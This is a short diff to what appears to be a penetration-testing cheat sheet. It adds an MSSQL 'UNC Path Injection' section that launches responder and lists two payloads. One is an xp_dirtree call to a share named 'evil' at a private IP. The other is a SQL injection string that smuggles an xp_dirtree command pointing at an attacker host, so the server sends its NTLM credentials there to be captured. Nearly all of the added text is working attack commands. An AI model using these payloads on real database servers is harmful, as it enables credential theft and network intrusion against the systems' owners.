@@ -223,7 +223,22 @@ mimikatz # !-
 
 ## MS Exhchange 
 
-### Exchange User Enumeration 
+
+
+## MSSQL Server 
+
+### UNC Path Injection
+
+[ ❓ ] : Uniform Naming Convention __allows the sharing of resources__ on a network via a very precise syntax: `\IP-Server\shareName\Folder\File`
+
+launch responder : `responder -I eth0`
+
+```sql
+EXEC master..xp_dirtree \"\\\\192.168.1.33\\\\evil\";
+```
+```sql
+1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';-- 
+```
 
 
 ## Forest Persistence 
